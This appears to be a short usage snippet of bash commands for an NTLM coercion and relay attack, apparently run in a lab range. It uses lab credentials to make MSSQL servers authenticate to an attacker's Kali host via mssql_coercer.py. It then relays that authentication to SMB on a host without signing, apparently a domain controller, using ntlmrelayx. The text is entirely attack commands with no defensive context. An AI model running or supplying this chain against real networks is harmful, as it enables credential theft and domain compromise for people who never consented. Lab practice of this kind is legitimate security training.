
```bash
#Single targeted MSSQL server.
python3 mssql_coercer.py ludus/sql-user1:'Passw0rd!'@10.6.15.12 -windows-auth -xp-target 10.6.15.10

```bash
#Multiple IPs for targeted MSSQL servers. -xp-target <kali host>. ~/ip_addresses_file.txt is a file with MSSQL servers.
python3 mssql_coercer.py ludus/sql-user1:'Passw0rd!'@dummy -windows-auth -ip-file ~/ip_addresses_file.txt -xp-target 10.6.15.10 -share-name test
```

---

```bash
#Relay to SMB on different host without SMB signing. Where smb://<domain controller>
python3 ntlmrelayx.py -t smb://10.6.15.13 -smb2support
```
